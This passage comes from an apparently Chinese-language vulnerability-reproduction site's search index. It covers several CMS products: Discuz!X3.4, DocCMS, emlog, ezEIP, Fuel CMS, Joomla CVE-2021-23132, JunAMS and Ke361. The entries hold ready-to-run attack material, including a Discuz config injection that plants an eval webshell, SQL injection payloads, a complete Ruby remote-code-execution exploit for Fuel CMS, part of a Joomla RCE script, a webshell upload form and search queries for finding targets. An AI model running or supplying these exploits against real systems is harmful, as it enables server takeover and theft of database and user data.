","date":"0001-01-01","objectID":"/discuzx-3.4-admincp_setting.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/discuzx-3.4-admincp_setting.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Discuz!X3.4 后台修改UCenter配置getshell漏洞 ","date":"0001-01-01","objectID":"/discuzx3.4-%E5%90%8E%E5%8F%B0%E4%BF%AE%E6%94%B9ucenter%E9%85%8D%E7%BD%AEgetshell%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/discuzx3.4-%E5%90%8E%E5%8F%B0%E4%BF%AE%E6%94%B9ucenter%E9%85%8D%E7%BD%AEgetshell%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 漏洞利用流程如下： 进入后台站长-UCenter设置，修改UCenter通信密钥为123456。 修改UC_API=http://your-ip/discuz!x3.4/uc_server');eval($_POST[cmd]);//，点击保存。 利用UC_KEY(dz) 生成code参数，执行脚本php ucode.php生成code。 Burpsuite带code参数发送GET请求，结果为1表示成功。 生成code参数的脚本 ucode.php： \u003c?php $uc_key=\"123456\";//此处填写刚才UCenter设置的值 $time = time() + 720000; $str = \"time=\".$time.\"\u0026action=updateapps\"; $code = authcode($str,\"ENCODE\",$uc_key); $code = str_replace('+','%2b',$code); $code = str_replace('/','%2f',$code); echo $code; function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) { $ckey_length = 4; $key = md5($key != '' ? $key : '123456'); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i \u003c= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i \u003c 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i \u003c $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == 'DECODE') { if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() \u003e 0) \u0026\u0026 substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.str_replace('=', '', base64_encode($result)); } } ?\u003e 带code参数发送GET请求： 请求数据包： GET /discuz!x3.4/api/uc.php?code=ac7091oTLALD6X24gZeiX5YmqDkLnX4ivIqx1jDnA7NhUAcHHOX3fWWOLWpGwSwfQfz4r5Pgf86bRlDTRkQ% HTTP/1.1 Host: your-ip Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8 Connection: close Content-Length: 133 \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003croot\u003e \u003citem id=\"UC_API\"\u003ehttp://your-ip/discuz!x3.4/uc_server\u003c/item\u003e \u003c/root\u003e Shell 地址： http://your-ip/discuz!x3.4/config/config_ucenter.php ","date":"0001-01-01","objectID":"/discuzx3.4-%E5%90%8E%E5%8F%B0%E4%BF%AE%E6%94%B9ucenter%E9%85%8D%E7%BD%AEgetshell%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/discuzx3.4-%E5%90%8E%E5%8F%B0%E4%BF%AE%E6%94%B9ucenter%E9%85%8D%E7%BD%AEgetshell%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"DocCMS keyword SQL注入漏洞 ","date":"0001-01-01","objectID":"/doccms-keyword-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/doccms-keyword-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 DocCMS keyword参数存在 SQL注入漏洞，攻击者通过漏洞可以获取数据库信息 ","date":"0001-01-01","objectID":"/doccms-keyword-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/doccms-keyword-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 DocCMS ","date":"0001-01-01","objectID":"/doccms-keyword-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/doccms-keyword-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Doccms\" ","date":"0001-01-01","objectID":"/doccms-keyword-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/doccms-keyword-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 CMS官网 验证POC /search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33 其中payload为下列语句的二次Url编码 ' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))# ","date":"0001-01-01","objectID":"/doccms-keyword-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/doccms-keyword-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"emlog widgets.php 后台SQL注入漏洞 ","date":"0001-01-01","objectID":"/emlog-widgets.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/emlog-widgets.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 emlog widgets.php文件在登录后通过构造特殊语句导致SQL注入，获取数据库敏感信息 ","date":"0001-01-01","objectID":"/emlog-widgets.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/emlog-widgets.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 emlog 6.0 ","date":"0001-01-01","objectID":"/emlog-widgets.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/emlog-widgets.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"EMLOG\" ","date":"0001-01-01","objectID":"/emlog-widgets.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/emlog-widgets.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品主页：https://github.com/emlog/emlog 存在漏洞的文件为 admin/widgets.php if ($action == 'compages') { $wgNum = isset($_POST['wgnum']) ? intval($_POST['wgnum']) : 1;//侧边栏编号 1、2、3 …… $widgets = isset($_POST['widgets']) ? serialize($_POST['widgets']) : ''; Option::updateOption(\"widgets{$wgNum}\", $widgets); $CACHE-\u003eupdateCache('options'); emDirect(\"./widgets.php?activated=true\u0026wg=$wgNum\"); } 传参为 wgnum 和 widgets ，跟踪方法 updateOption static function updateOption($name, $value, $isSyntax = false){ $DB = Database::getInstance(); $value = $isSyntax ? $value : \"'$value'\"; $DB-\u003equery('UPDATE '.DB_PREFIX.\"options SET option_value=$value where option_name='$name'\"); } 可以发现对传入的参数木有进行过滤，构造Payload POST /admin/widgets.php?action=compages widgets=1' and updatexml(0x3a,concat(1,(select user())),1)-- 调试后可以发现，数据库报错语句会回显至页面中，报错注入即可获取敏感信息 ","date":"0001-01-01","objectID":"/emlog-widgets.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/emlog-widgets.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"ezEIP 4.1.0 信息泄露漏洞 ","date":"0001-01-01","objectID":"/ezeip-4.1.0-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/ezeip-4.1.0-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 ezEIP 4.1.0 存在信息泄露漏洞，通过遍历Cookie中的参数值获取敏感信息 ","date":"0001-01-01","objectID":"/ezeip-4.1.0-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/ezeip-4.1.0-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 ezEIP 4.1.0 ","date":"0001-01-01","objectID":"/ezeip-4.1.0-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/ezeip-4.1.0-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"ezEIP\" ","date":"0001-01-01","objectID":"/ezeip-4.1.0-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/ezeip-4.1.0-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 漏洞Url为 /label/member/getinfo.aspx 访问时添加Cookie（通过遍历获取用户的登录名电话邮箱等信息） WHIR_USERINFOR=whir_mem_member_pid=1; ","date":"0001-01-01","objectID":"/ezeip-4.1.0-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/ezeip-4.1.0-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Fuel CMS 1.4.1 远程代码执行漏洞 ","date":"0001-01-01","objectID":"/fuel-cms-1.4.1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/fuel-cms-1.4.1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 参考链接： https://github.com/nahi/httpclient/issues/242 https://www.exploit-db.com/exploits/49487 ","date":"0001-01-01","objectID":"/fuel-cms-1.4.1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/fuel-cms-1.4.1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"Fuel CMS\" ","date":"0001-01-01","objectID":"/fuel-cms-1.4.1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/fuel-cms-1.4.1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 poc： /fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('#{cmd}')%2B' #!/usr/bin/env ruby require 'httpclient' require 'docopt' # dirty workaround to ignore Max-Age # https://github.com/nahi/httpclient/issues/242#issuecomment-69013932 $VERBOSE = nil doc = \u003c\u003c~DOCOPT Fuel CMS 1.4 - Remote Code Execution Usage: #{__FILE__} \u003curl\u003e \u003ccmd\u003e #{__FILE__} -h | --help Options: \u003curl\u003e Root URL (base path) including HTTP scheme, port and root folder \u003ccmd\u003e The system command to execute -h, --help Show this screen Examples: #{__FILE__} http://example.org id #{__FILE__} https://example.org:8443/fuelcms 'cat /etc/passwd' DOCOPT def exploit(client, root_url, cmd) url = root_url + \"/fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('#{cmd}')%2B'\" res = client.get(url) /system(.+?)\u003cdiv/mx.match(res.body).captures[0].chomp end begin args = Docopt.docopt(doc) clnt = HTTPClient.new puts exploit(clnt, args['\u003curl\u003e'], args['\u003ccmd\u003e']) rescue Docopt::Exit =\u003e e puts e.message end ","date":"0001-01-01","objectID":"/fuel-cms-1.4.1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/fuel-cms-1.4.1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Joomla 目录遍历及远程代码执行漏洞 CVE-2021-23132 ","date":"0001-01-01","objectID":"/joomla-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-23132/:0:0","tags":null,"title":"","uri":"/joomla-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-23132/"},{"categories":null,"content":"漏洞描述 Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，是全球知名的一套内容管理系统（CMS）。 本漏洞涉及到目录遍历及进一步导致的RCE漏洞。在Joomla! 3.0.0到3.9.24版本中，Joomla!的com_media组件配置允许被任意修改导致Web级别目录遍历，攻击者通过一系列操作，进一步会导致远程命令执行。 ","date":"0001-01-01","objectID":"/joomla-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-23132/:1:0","tags":null,"title":"","uri":"/joomla-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-23132/"},{"categories":null,"content":"漏洞影响 3.0.0 \u003c= Joomla! \u003c= 3.9.24 ","date":"0001-01-01","objectID":"/joomla-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-23132/:2:0","tags":null,"title":"","uri":"/joomla-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-23132/"},{"categories":null,"content":"网络测绘 app=\"Joomla\" ","date":"0001-01-01","objectID":"/joomla-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-23132/:3:0","tags":null,"title":"","uri":"/joomla-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-23132/"},{"categories":null,"content":"漏洞复现 获取超级管理员权限，触发RCE。 poc： http://target/templates/protostar/error.php?cmd=ls python3 cve-2021-23132.py -url http://192.168.72.140 -u admin -p 1234 -rce 1 -cmd ls cve-2021-23132.py： #!/usr/bin/python3 import sys import requests import re import argparse #proxies = {\"http\": \"http://127.0.0.1:8080\",\"https\": \"http://127.0.0.1:8080\"} proxies={} try: import lxml.html except ImportError: print(\"module 'lxml' doesn't exist, type: pip3 install lxml\") exit(0) def writeConfigFile(filename): print(\"[+] Creating config.xml \") content=\"\"\"\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cconfig\u003e \u003cfieldset name=\"user_options\" label=\"COM_USERS_CONFIG_USER_OPTIONS\" \u003e \u003cfield name=\"allowUserRegistration\" type=\"radio\" label=\"COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_LABEL\" description=\"COM_USERS_CONFIG_FIELD_ALLOWREGISTRATION_DESC\" class=\"btn-group btn-group-yesno\" default=\"1\" \u003e \u003coption value=\"1\"\u003eJYES\u003c/option\u003e \u003coption value=\"0\"\u003eJNO\u003c/option\u003e \u003c/field\u003e \u003cfield name=\"new_usertype\" type=\"usergrouplist\" label=\"COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_LABEL\" description=\"COM_USERS_CONFIG_FIELD_NEW_USER_TYPE_DESC\" default=\"2\" checksuperusergroup=\"0\" /\u003e \u003cfield name=\"guest_usergroup\" type=\"usergrouplist\" label=\"COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_LABEL\" description=\"COM_USERS_CONFIG_FIELD_GUEST_USER_GROUP_DESC\" default=\"1\" checksuperusergroup=\"0\" /\u003e \u003cfield name=\"sendpassword\" type=\"radio\" label=\"COM_USERS_CONFIG_FIELD_SENDPASSWORD_LABEL\" description=\"COM_USERS_CONFIG_FIELD_SENDPASSWORD_DESC\" class=\"btn-group btn-group-yesno\" default=\"1\" \u003e \u003coption value=\"1\"\u003eJYES\u003c/option\u003e \u003coption value=\"0\"\u003eJNO\u003c/option\u003e \u003c/field\u003e \u003cfield name=\"useractivation\" type=\"list\" label=\"COM_USERS_CONFIG_FIELD_USERACTIVATION_LABEL\" description=\"COM_USERS_CONFIG_FIELD_USERACTIVATION_DESC\" default=\"0\" \u003e \u003coption value=\"0\"\u003eJNONE\u003c/option\u003e \u003coption value=\"1\"\u003eCOM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_SELFACTIVATION\u003c/option\u003e \u003coption value=\"2\"\u003eCOM_USERS_CONFIG_FIELD_USERACTIVATION_OPTION_ADMINACTIVATION\u003c/option\u003e \u003c/field\u003e \u003cfield name=\"mail_to_admin\" type=\"radio\" label=\"COM_USERS_CONFIG_FIELD_MAILTOADMIN_LABEL\" description=\"COM_USERS_CONFIG_FIELD_MAILTOADMIN_DESC\" class=\"btn-group btn-group-yesno\" default=\"0\" \u003e \u003coption value=\"1\"\u003eJYES\u003c/option\u003e \u003coption value=\"0\"\u003eJNO\u003c/option\u003e \u003c/field\u003e \u003cfield name=\"captcha\" type=\"plugins\" label=\"COM_USERS_CONFIG_FIELD_CAPTCHA_LABEL\" description=\"COM_USERS_CONFIG_FIELD_CAPTCHA_DESC\" folder=\"captcha\" filter=\"cmd\" useglobal=\"true\" \u003e \u003coption value=\"0\"\u003eJOPTION_DO_NOT_USE\u003c/option\u003e \u003c/field\u003e \u003cfield name=\"frontend_userparams\" type=\"radio\" label=\"COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_LABEL\" description=\"COM_USERS_CONFIG_FIELD_FRONTEND_USERPARAMS_DESC\" class=\"btn-group btn-group-yesno\" default=\"1\" \u003e \u003coption value=\"1\"\u003eJSHOW\u003c/option\u003e \u003coption value=\"0\"\u003eJHIDE\u003c/option\u003e \u003c/field\u003e \u003cfield name=\"site_language\" type=\"radio\" label=\"COM_USERS_CONFIG_FIELD_FRONTEND_LANG_LABEL\" description=\"COM_USERS_CONFIG_FIELD_FRONTEND_LANG_DESC\" class=\"btn-group btn-group-yesno\" default=\"0\" showon=\"frontend_userparams:1\" \u003e \u003coption value=\"1\"\u003eJSHOW\u003c/option\u003e \u003coption value=\"0\"\u003eJHIDE\u003c/option\u003e \u003c/field\u003e \u003cfield name=\"change_login_name\" type=\"radio\" label=\"COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_LABEL\" description=\"COM_USERS_CONFIG_FIELD_CHANGEUSERNAME_DESC\" class=\"btn-group btn-group-yesno\" default=\"0\" \u003e \u003coption value=\"1\"\u003eJYES\u003c/option\u003e \u003coption value=\"0\"\u003eJNO\u003c/option\u003e \u003c/field\u003e \u003c/fieldset\u003e \u003cfieldset name=\"domain_options\" label=\"COM_USERS_CONFIG_DOMAIN_OPTIONS\" \u003e \u003cfield name=\"domains\" type=\"subform\" label=\"COM_USERS_CONFIG_FIELD_DOMAINS_LABEL\" description=\"COM_USERS_CONFIG_FIELD_DOMAINS_DESC\" multiple=\"true\" layout=\"joomla.form.field.subform.repeatable-table\" formsource=\"administrator/components/com_users/models/forms/config_domain.xml\" /\u003e \u003c/fieldset\u003e \u003cfieldset name=\"password_options\" label=\"COM_USERS_CONFIG_PASSWORD_OPTIONS\" \u003e \u003cfield name=\"reset_count\" type=\"integer\" label=\"COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_LABEL\" description=\"COM_USERS_CONFIG_FIELD_FRONTEND_RESET_COUNT_DESC\" first=\"0\" last=\"20\" step=\"1\" default=\"1","date":"0001-01-01","objectID":"/joomla-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-23132/:4:0","tags":null,"title":"","uri":"/joomla-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-23132/"},{"categories":null,"content":"JunAms内容管理系统文件上传漏洞 CNVD-2020-24741 ","date":"0001-01-01","objectID":"/junams%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2020-24741/:0:0","tags":null,"title":"","uri":"/junams%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2020-24741/"},{"categories":null,"content":"漏洞描述 JunAMS是一款以ThinkPHP为框架的开源内容管理系统。 JunAMS内容管理系统存在文件上传漏洞，攻击者可利用该漏洞上传webshell，获取服务器权限。 参考链接： https://www.cnvd.org.cn/flaw/show/CNVD-2020-24741 ","date":"0001-01-01","objectID":"/junams%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2020-24741/:1:0","tags":null,"title":"","uri":"/junams%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2020-24741/"},{"categories":null,"content":"漏洞影响 JunAMS junAMS 1.2.1.20190403 ","date":"0001-01-01","objectID":"/junams%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2020-24741/:2:0","tags":null,"title":"","uri":"/junams%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2020-24741/"},{"categories":null,"content":"漏洞复现 exp： \u003cform enctype=\"multipart/form-data\" action=\"http://localhost//admin.php/common/add_images.html\" method=\"post\"\u003e \u003cinput type=\"file\" name=\"file\" size=\"50\"\u003e\u003cbr\u003e \u003cinput type=\"submit\" value=\"Upload\"\u003e \u003c/form\u003e ","date":"0001-01-01","objectID":"/junams%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2020-24741/:3:0","tags":null,"title":"","uri":"/junams%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-2020-24741/"},{"categories":null,"content":"Ke361 AuthManagerController.class.php 后台SQL注入漏洞 ","date":"0001-01-01","objectID":"/ke361-authmanagercontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/ke361-authmanagercontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Ke361 AuthManagerController.class.php uid参数存在 SQL注入漏洞，通过漏洞可以获取数据库敏感信息 ","date":"0001-01-01","objectID":"/ke361-authmanagercontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/ke361-authmanagercontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Ke361 ","date":"0001-01-01","objectID":"/ke361-authmanagercontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/ke361-authmanagercontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 https://gitee.com/jcove/ke361 ","date":"0001-01-01","objectID":"/ke361-authmanagercontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/ke361-authmanagercontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件为 Application/Admin/Controller/AuthManagerController.class.php /admin.php?s=/AuthManager/group/uid/1')%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+ ","date":"0001-01-01","objectID":"/ke361-authmanagercontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/ke361-authmanagercontroller.class.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Ke361 DistrictController.class.php 后台SQL注入漏洞 CNVD-2021-25002 